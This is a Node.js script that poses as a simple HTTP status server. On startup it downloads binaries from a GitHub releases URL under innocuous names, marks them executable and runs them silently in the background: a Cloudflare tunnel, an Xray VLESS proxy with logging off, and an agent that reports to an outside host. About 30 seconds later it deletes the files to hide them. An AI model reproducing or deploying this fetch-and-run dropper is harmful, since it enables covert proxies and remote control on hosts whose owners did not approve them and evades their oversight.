const http = require('http');
const fs = require('fs');
const { exec } = require('child_process');
const crypto = require('crypto');

const PORT = 8080;
const serverToken = process.env.SERVER_TOKEN || 'default_server_token';
const apiPassword = process.env.API_PASSWORD || 'default_api_password';
const clientId = process.env.CLIENT_ID || crypto.randomUUID();

const filesToDownload = [
  { url: 'https://github.com/aw12aw2021/se00/releases/download/lade/api', path: './api' },
  { url: 'https://github.com/aw12aw2021/se00/releases/download/lade/server', path: './server' },
  { url: 'https://github.com/aw12aw2021/se00/releases/download/lade/web.js', path: './web.js' }
];

function detectDownloadTools() {
  return new Promise((resolve) => {
    const tools = [];
    
    exec('which curl', (error) => {
      const hasCurl = !error;
      
      exec('which wget', (error2) => {
        const hasWget = !error2;
        
        if (hasCurl) tools.push('curl');
        if (hasWget) tools.push('wget');
        
        resolve(tools);
      });
    });
  });
}

function downloadFile(url, dest, availableTools) {
  return new Promise((resolve, reject) => {
    if (!availableTools || availableTools.length === 0) {
      return reject(new Error('No download tools available (curl or wget required)'));
    }
    
    function tryDownload(toolIndex) {
      if (toolIndex >= availableTools.length) {
        return reject(new Error(`All download attempts failed for ${url}`));
      }
      
      const tool = availableTools[toolIndex];
      let command;
      
      if (tool === 'curl') {
        command = `curl -4 -sL --connect-timeout 30 --max-time 300 ${url} -o ${dest}`;
      } else if (tool === 'wget') {
        command = `wget -q -4 --timeout=30 --tries=3 ${url} -O ${dest}`;
      } else {
        return tryDownload(toolIndex + 1);
      }
      
      exec(command, (error) => {
        if (error) {
          tryDownload(toolIndex + 1);
        } else {
          fs.access(dest, fs.constants.F_OK, (err) => {
            if (err) {
              tryDownload(toolIndex + 1);
            } else {
              fs.stat(dest, (statErr, stats) => {
                if (statErr || stats.size < 100) {
                  tryDownload(toolIndex + 1);
                } else {
                  resolve();
                }
              });
            }
          });
        }
      });
    }
    
    tryDownload(0);
  });
}

function createWebConfigFile() {
  const config = {
    log: { loglevel: "none" },
    inbounds: [{
      port: 9990,
      listen: "127.0.0.1",
      protocol: "vless",
      settings: {
        clients: [{ id: clientId, level: 0 }],
        decryption: "none"
      },
      streamSettings: {
        network: "ws",
        security: "none",
        wsSettings: { path: "/xyz" }
      }
    }],
    dns: { servers: ["1.1.1.1"] },
    outbounds: [{ protocol: "freedom" }]
  };
  fs.writeFileSync('./web.json', JSON.stringify(config));
}

function execCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout) => error ? reject(error) : resolve(stdout));
  });
}

function checkServiceHealth(processName) {
  return new Promise((resolve) => {
    exec(`pgrep -f "${processName}"`, (error) => {
      resolve(!error);
    });
  });
}

const server = http.createServer((req, res) => {
  if (req.url === '/status') {
    res.writeHead(200, {'Content-Type': 'application/json'});
    res.end(JSON.stringify({
      status: 'running',
      timestamp: Date.now(),
      clientId: clientId
    }));
  } else if (req.url === '/health') {
    Promise.all([
      checkServiceHealth('server tunnel'),
      checkServiceHealth('web.js'),
      checkServiceHealth('api')
    ]).then(([tunnel, proxy, api]) => {
      res.writeHead(200, {'Content-Type': 'application/json'});
      res.end(JSON.stringify({
        services: {
          tunnel: tunnel ? 'running' : 'stopped',
          proxy: proxy ? 'running' : 'stopped',
          api: api ? 'running' : 'stopped'
        },
        overall: (tunnel && proxy && api) ? 'healthy' : 'degraded'
      }));
    });
  } else {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('>>> yeah ......');
  }
});

server.listen(PORT, '0.0.0.0', async () => {
  try {
    const availableTools = await detectDownloadTools();
    if (availableTools.length === 0) {
      throw new Error('Neither curl nor wget is available');
    }
    
    createWebConfigFile();
    
    await Promise.all(filesToDownload.map(file => 
      downloadFile(file.url, file.path, availableTools)
    ));
    
    await execCommand('chmod +x server web.js api');
    
    const services = [
      {
        name: 'Cloudflare Tunnel',
        command: `nohup ./server tunnel --edge-ip-version 4 run --protocol http2 --token ${serverToken} >/dev/null 2>&1 &`,
        check: 'server tunnel'
      },
      {
        name: 'Xray Proxy',
        command: 'nohup ./web.js -c ./web.json >/dev/null 2>&1 &',
        check: 'web.js'
      },
      {
        name: 'API Service',
        command: `nohup ./api -s xix.xxixx.aa.am:443 -p ${apiPassword} --report-delay 2 --tls >/dev/null 2>&1 &`,
        check: 'api'
      }
    ];
    
    for (const service of services) {
      await execCommand(service.command);
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const isRunning = await checkServiceHealth(service.check);
      if (!isRunning) {
        throw new Error(`Failed to start ${service.name}`);
      }
    }
    
    setTimeout(() => {
      exec('rm -f server web.js api web.json', () => {});
    }, 30000);
    
  } catch (error) {
    process.exit(1);
  }
});

process.on('SIGTERM', () => process.exit(0));

process.on('SIGINT', () => process.exit(0));

